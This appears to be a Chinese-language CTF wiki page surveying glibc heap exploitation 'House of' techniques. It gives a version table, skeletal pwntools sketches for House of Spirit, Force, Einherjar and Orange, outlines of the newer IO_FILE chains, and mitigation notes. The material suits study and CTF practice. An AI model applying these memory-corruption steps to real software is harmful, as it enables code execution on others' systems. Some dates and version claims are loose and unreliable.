# House 系列 (House of Series)

## 原理

House 系列是 glibc 堆利用的经典技术集合，每个 House 针对特定的 glibc 版本或保护机制，通过特定的堆操作序列实现任意代码执行。

## House 系列总览

| House | 适用版本 | 利用方式 | 难度 |
|-------|---------|---------|------|
| House of Spirit | 通用 | 伪造 chunk + free + malloc | 低 |
| House of Force | < 2.29 | 覆盖 top chunk size | 中 |
| House of Lore | < 2.29 | smallbin attack | 中 |
| House of Einherjar | 通用 | off-by-one 触发合并 | 中 |
| House of Orange | < 2.34 | unsorted bin + IO_FILE | 高 |
| House of Rabbit | < 2.29 | fastbin 合并 | 中 |
| House of Roman | < 2.29 | partial overwrite | 高 |
| House of Storm | < 2.29 | unsorted bin + largebin | 高 |
| House of Husk | < 2.34 | printf format string | 中 |
| House of Banana | 2.34+ | exit_funcs | 高 |
| House of Apple | 2.34+ | IO_FILE | 高 |
| House of Cat | 2.35+ | IO_FILE | 高 |
| House of Emu | 2.36+ | IO_FILE | 高 |

## 经典 House 详解

### 1. House of Spirit

```python
# 在栈/BSS 上伪造 chunk
# 1. 在目标地址伪造 chunk 元数据
#    target_addr: prev_size(8) + size(8) + data
# 2. free 该地址
# 3. malloc 返回该地址

from pwn import *

p = process('./pwn')

# 伪造 chunk
target = 0x404100
# 写入 size
write(target + 8, p64(0x31))  # size = 0x31
# free
free(target + 0x10)  # free chunk 起始地址
# malloc
malloc(0x20)  # 返回 target + 0x10
```

### 2. House of Force

```python
# glibc < 2.29
# 覆盖 top chunk size 为很大值
# 然后分配大 chunk，top chunk 移动到目标地址

from pwn import *

p = process('./pwn')

# 1. 泄露堆地址
heap_addr = ...
# 2. 溢出覆盖 top chunk size
edit(top_chunk_offset, p64(0xffffffffffffffff))
# 3. 计算偏移
target = 0x404000
offset = target - heap_addr - 0x10  # 减去 chunk header
# 4. 分配大 chunk
malloc(offset)
# 5. 再次分配，返回 target
malloc(0x20)
```

### 3. House of Einherjar

```python
# off-by-one 触发 chunk 合并
# 1. 分配 chunk A, B
malloc(0x18)  # A
malloc(0x18)  # B
# 2. off-by-one 覆盖 B 的 prev_size 和 PREV_INUSE
edit(A, b'A' * 0x18 + p64(0x20))  # 覆盖 B 的 prev_size
# 3. 伪造 A 前面的 chunk
fake_chunk = ...
# 4. free B，触发合并
free(B)
# 合并后的 chunk 包含 A 和 B
```

### 4. House of Orange

```python
# glibc < 2.34
# 无 free 函数时利用
# 1. 溢出 top chunk size
# 2. 分配大 chunk，触发 top chunk free 到 unsorted bin
# 3. 利用 unsorted bin attack + IO_FILE

from pwn import *

p = process('./pwn')

# 1. 溢出 top chunk
edit(top_chunk_offset, p64(0xfe1))  # 修改 size
# 2. 分配大 chunk
malloc(0x1000)
# top chunk 被 free 到 unsorted bin
# 3. 泄露 libc
# 4. 构造 fake IO_FILE
# 5. 触发 _IO_OVERFLOW
```

### 5. House of Husk

```python
# glibc < 2.34
# 利用 printf 的 format string 机制
# 1. 通过 unsorted bin attack 覆盖 __printf_function_table
# 2. 通过 unsorted bin attack 覆盖 __printf_arginfo_table
# 3. 触发 printf，执行任意函数
```

## glibc 2.34+ 新 House

### 6. House of Banana

```python
# glibc 2.34+
# 通过 exit_funcs 实现 RCE
# 1. 泄露 libc 地址
# 2. 通过堆漏洞覆盖 __exit_funcs
# 3. 构造 fake exit_function_list
# 4. 触发 exit，执行任意函数
```

### 7. House of Apple

```python
# glibc 2.34+
# 通过 IO_FILE 实现 RCE
# 利用 _IO_wfile_overflow 等 wide char 函数

# House of Apple 2
# 1. 通过堆漏洞修改 _IO_list_all
# 2. 构造 fake IO_FILE
# 3. 触发 _IO_wfile_overflow
# 4. 调用 _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE
# 5. 执行任意函数

# House of Apple 3
# 类似 Apple 2，但利用不同的 IO 函数
```

### 8. House of Cat

```python
# 2024 年新利用链
# glibc 2.35+
# 通过 largebin + IO_FILE 实现 RCE

# 1. largebin attack 修改 _IO_list_all
# 2. 构造 fake IO_FILE
# 3. 触发 IO 操作
# 4. 执行任意函数
```

### 9. House of Emu

```python
# glibc 2.36+
# 新的 IO_FILE 利用
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks

```python
# 传统 __malloc_hook/__free_hook 失效
# House of Apple/Banana/Cat 成为主流
```

### 2. safe-linking

```python
# glibc 2.32+
# tcache/fastbin 指针加密
# 影响 House of Spirit 等
```

### 3. 硬件级防护

```python
# Intel CET
# ARM PAC/BTI
# MTE (Memory Tagging Extension)
# 影响 House 系列
```

### 4. 沙箱环境

```python
# seccomp 限制
# 通过 ORW (open/read/write) 绕过
# House of Cat 支持 ORW
```

### 5. 新型 House

```python
# 持续有新的 House 被发现
# 关注最新研究
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试
- **how2heap** — 各种 House 的 PoC

## 参考链接

- [ctf-wiki House of](https://ctf-wiki.org/pwn/linux/glibc-heap/house_of_spirit/)
- [how2heap](https://github.com/shellphish/how2heap)
- [House of Apple](https://ctf-wiki.org/pwn/linux/glibc-heap/house_of_apple/)
- [House of Cat](https://www.jianshu.com/p/4d7d7a460c0c)
